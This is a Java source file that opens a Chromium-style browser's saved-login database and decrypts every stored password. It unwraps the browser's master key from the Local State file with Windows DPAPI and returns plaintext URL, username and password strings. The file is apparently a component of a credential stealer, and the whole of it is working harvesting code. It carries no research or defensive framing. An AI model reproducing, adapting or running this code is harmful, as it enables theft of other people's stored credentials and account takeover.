package _256.utils.decrypt.password;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

import com.github.windpapi4j.WinDPAPI;
import com.github.windpapi4j.WinDPAPI.CryptProtectFlag;

import _256.utils.decrypt.DecryptUtil;

public class PasswordDecrypt {

	private File PASSWORD_PATH = null;
	private File LOCAL_STATE_PATH = null;
	public List<String> PASSWORD_DATA;
	public List<String> PASSWORDS;

	public PasswordDecrypt(String path0, String path1) {
		this.PASSWORD_PATH = new File(path0);
		this.LOCAL_STATE_PATH = new File(path1);
		this.PASSWORDS = new ArrayList<String>();
		this.PASSWORD_DATA = new ArrayList<String>();
	}

	public String getData() {
		StringBuilder temp = new StringBuilder();
		PASSWORDS.stream().forEach(password -> temp.append(password + "\n"));
		return temp.toString();
	}

	public PasswordDecrypt getPasswords() {
		HashSet<Password> PASSWORDS = new HashSet<>();
		Connection connection = null;
		File tempFile = null;
		try {
			tempFile = new File(UUID.randomUUID().toString());
			FileUtils.copyFile(this.PASSWORD_PATH, tempFile);
			connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			ResultSet resultSet = statement.executeQuery("SELECT * FROM logins");
			while (resultSet.next()) {
				parsePasswordFromResult(tempFile, PASSWORDS, resultSet);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			try {
				if (connection != null) {
					connection.close();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		tempFile.delete();
		return this;
	}

	private void parsePasswordFromResult(File passwordStore, HashSet<Password> passwordSet, ResultSet resultSet) throws SQLException {
		String url = resultSet.getString(1);
		String name = resultSet.getString(4);
		byte[] passwordBytes = resultSet.getBytes(6);
		String format = "URL: " + url + "\nLogin: " + name + "\nPassword: " + decrypt(passwordBytes) + "\n";
		if (!format.split("\n")[2].equals("empty")) {
			PASSWORDS.add(format);
		}
	}

	private String decrypt(byte[] encryptedBytes) {
		byte[] decryptedBytes = null;
		byte[] encryptedValue = encryptedBytes;
		try {
			boolean isV10 = new String(encryptedValue).startsWith("v10") || new String(encryptedValue).startsWith("v11");
			if (WinDPAPI.isPlatformSupported()) {
				WinDPAPI winDPAPI = WinDPAPI.newInstance(CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
				if (!isV10) {
					decryptedBytes = winDPAPI.unprotectData(encryptedValue);
				} else {
					if (!LOCAL_STATE_PATH.exists()) {
						throw new IllegalArgumentException("Local State is required");
					}
					String localState = FileUtils.readFileToString(LOCAL_STATE_PATH);
					JSONObject jsonObject = new JSONObject(localState);
					String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
					byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);
					if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {
						throw new IllegalStateException("Local State should start with DPAPI");
					}
					encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
					byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
					if (keyBytes.length != 256 / 8) {
						throw new IllegalStateException("Local State key length is wrong");
					}
					byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "V10".length(), "V10".length() + 96 / 8);
					encryptedValue = Arrays.copyOfRange(encryptedValue, "V10".length() + 96 / 8, encryptedValue.length);
					decryptedBytes = DecryptUtil.getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
				}
			}
		} catch (Exception e) {
			return "empty";
		}
		if (decryptedBytes == null) {
			return "empty";
		} else {
			return new String(decryptedBytes);
		}
	}
}
